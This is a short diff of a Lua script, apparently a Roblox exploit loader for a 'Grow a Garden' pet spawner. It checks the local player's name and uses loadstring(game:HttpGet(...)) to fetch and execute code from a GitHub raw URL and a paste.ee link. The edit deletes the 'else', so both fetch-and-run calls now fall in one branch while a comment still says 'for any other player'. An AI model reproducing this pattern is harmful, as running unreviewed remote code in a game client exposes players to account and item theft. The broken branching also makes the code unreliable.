@@ -155,9 +155,9 @@ task.spawn(function()
         -- --- PLAYER DETECTION LOGIC ---
         local player = game.Players.LocalPlayer
         if player and player.Name == "playsafe_kurt" then
-            -- This is the original script URL for 'mikey246128'
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual", true))()
-        else
+            -- This is the original script URL for 'playsafe_kurt'
+            
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/petspawner/refs/heads/main/GrowaGardenVisual",true))()
             -- This is for any other player
             loadstring(game:HttpGet("https://paste.ee/r/1ux6SbhY"))()
 
